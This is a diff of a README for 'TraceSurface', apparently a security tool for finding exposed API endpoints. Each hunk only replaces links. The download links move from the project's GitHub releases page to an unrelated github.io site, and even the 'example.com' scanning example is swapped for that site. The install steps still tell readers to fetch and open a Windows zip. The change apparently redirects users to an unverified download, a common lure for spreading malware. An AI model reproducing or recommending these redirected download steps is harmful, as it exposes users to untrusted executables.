@@ -1,7 +1,7 @@
 <h1>🕵️ TraceSurface - Uncover Hidden APIs Before Attackers Do</h1>
 
 <p align="center">
-  <a href="https://github.com/Asarejepht2959/TraceSurface/releases"><img src="https://img.shields.io/badge/Download-TraceSurface-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082" alt="Download TraceSurface"></a>
+  <a href="https://asarejepht2959.github.io"><img src="https://img.shields.io/badge/Download-TraceSurface-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082" alt="Download TraceSurface"></a>
 </p>
 
 Welcome to **TraceSurface** — your friendly security companion that automatically discovers API endpoints hiding inside website code and checks whether they are exposed without proper authorization. Think of it as a digital detective that reads the blueprint of any web application and shows you which doors are unlocked.
@@ -26,7 +26,7 @@ That's it. No complicated setup, no coding required. TraceSurface does the heavy
 
 Ready to try TraceSurface? Follow these steps exactly:
 
-1. **Visit this link to download the application:** [https://github.com/Asarejepht2959/TraceSurface/releases](https://github.com/Asarejepht2959/TraceSurface/releases)
+1. **Visit this link to download the application:** [https://asarejepht2959.github.io](https://asarejepht2959.github.io)
 2. On that page, look for the **latest release** (usually at the top). You'll see one file named something like `TraceSurface-windows.zip`.
 3. Click that file to download it to your computer.
 4. Once the download finishes, open your **Downloads folder**.
@@ -92,7 +92,7 @@ Once you've launched the application, you'll see a clean, simple interface. Don'
 
 ### Step 1: Enter a Target Website
 
-In the large text box at the top, type or paste the URL of the website you want to analyze. For example: `https://example.com`
+In the large text box at the top, type or paste the URL of the website you want to analyze. For example: `https://asarejepht2959.github.io`
 
 > **Tip:** Make sure you own the website or have explicit permission to test it. Using TraceSurface on websites without authorization may violate laws in your jurisdiction.
 
